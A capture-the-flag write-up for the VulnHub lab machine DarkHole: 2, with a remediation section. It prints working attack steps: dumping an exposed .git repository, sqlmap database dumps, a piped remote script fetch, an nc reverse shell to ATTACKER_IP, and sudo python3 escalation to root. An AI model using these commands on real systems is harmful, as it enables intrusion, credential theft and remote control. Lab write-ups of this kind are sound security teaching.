# DarkHole: 2 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.1.179 (host-only) |
| **Difficulty** | Medium-Hard |
| **OS** | Linux |
| **Root Flag** | root.txt (value in screenshot) |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/darkhole-2,740/) |

## Attack Summary

nmap → exposed `.git` directory → git-dumper → git diff leaks credentials → login → SQLmap (Burp cookie) → SSH as jehad → LinPEAS → SSH local port-forward 9999 → command injection on internal PHP app → reverse shell as losy → .bash_history → sudo python3 → root

## Methodology

1. Network discovery and port scan
2. Dump exposed `.git` repository
3. Extract credentials from git diff
4. SQL injection via Burp Suite intercept to dump additional credentials
5. SSH access and local port-forwarding
6. Command injection on internal PHP web app
7. Credential extraction from bash history
8. Privilege escalation via sudo python3

---

## Step 1: Network Discovery

```bash
sudo netdiscover
nmap -A 192.168.1.179
```

Open ports: 22 (SSH), 80 (Apache). The web server exposes a `.git` directory.

![Nmap scan](images/01-nmap.png)

---

## Step 2: Dump Exposed Git Repository

```bash
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
mkdir backup
python3 git_dumper.py http://192.168.1.179/.git/ backup
cd backup

# Review commit history
git log

# Diff against an older commit to find removed credentials
git diff a4d900a8d85e8938d3601f3cef113ee293028e10
```

Credentials extracted from the diff:
- **Email:** `lush@admin.com`
- **Password:** `321`

![Git dump and diff](images/02-git-dump.png)

---

## Step 3: Login + SQL Injection via Burp Suite

Log in to the web app with the recovered credentials. Intercept the authenticated request with Burp Suite and save cookies to a file:

```bash
# Save the Burp Suite cookie file as 'sql'
sqlmap -r sql --dbs --batch
sqlmap -r sql -D darkhole_2 --dump-all --batch
```

Credentials extracted from `darkhole_2` database:
- **User:** `jehad`
- **Password:** `fool`

![SQLmap dump](images/03-sqlmap.png)

---

## Step 4: SSH Access and Port-Forwarding

```bash
ssh jehad@192.168.1.179
# password: fool
id
```

Run LinPEAS to discover an internal PHP application on `localhost:9999` running as user `losy`:

```bash
curl -sL https://raw.githubusercontent.com/carlospalop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

Forward port 9999 from another terminal:

```bash
ssh jehad@192.168.1.179 -L 9999:localhost:9999
```

Browse to `http://127.0.0.1:9999/?cmd=id` — confirms RCE.

---

## Step 5: Reverse Shell via Internal App

URL-encode the payload (use Burp Decoder or `python3 -c "import urllib.parse; print(urllib.parse.quote(...))"`) and pass it via the `cmd` parameter:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 8888 >/tmp/f
```

Start a listener:

```bash
nc -lvp 8888
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Read the user flag and bash history:

```bash
cd /home/losy
cat user.txt
cat .bash_history
# Password for losy: gang
```

![Shell as losy](images/04-shell.png)

---

## Step 6: Privilege Escalation — sudo python3

```bash
su losy
# password: gang
sudo -l
# (root) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
cat /root/root.txt
```

![Root flag](images/05-root.png)

---

## Lessons Learned

1. **Exposed `.git` directory** leaks full source code history including deleted credentials — always add `.git` to web server deny rules
2. **SQL injection with authenticated session cookies** — even authenticated endpoints must use parameterized queries
3. **Internal services accessible via SSH port-forwarding** expand the attack surface significantly
4. **sudo python3 NOPASSWD** is a well-known GTFOBins escalation — never grant unrestricted interpreter sudo access
5. **bash_history in plaintext** can expose credentials stored by careless users

## Remediation

| Vulnerability | Fix |
|---|---|
| Exposed `.git` directory | `Deny from all` in `.htaccess` or Nginx config for `/.git/` |
| SQL injection | Parameterized queries throughout |
| sudo python3 NOPASSWD | Remove from sudoers; use role-based access instead |
| Credentials in bash_history | `HISTFILE=/dev/null` or clear with `history -c`; never type passwords in commands |
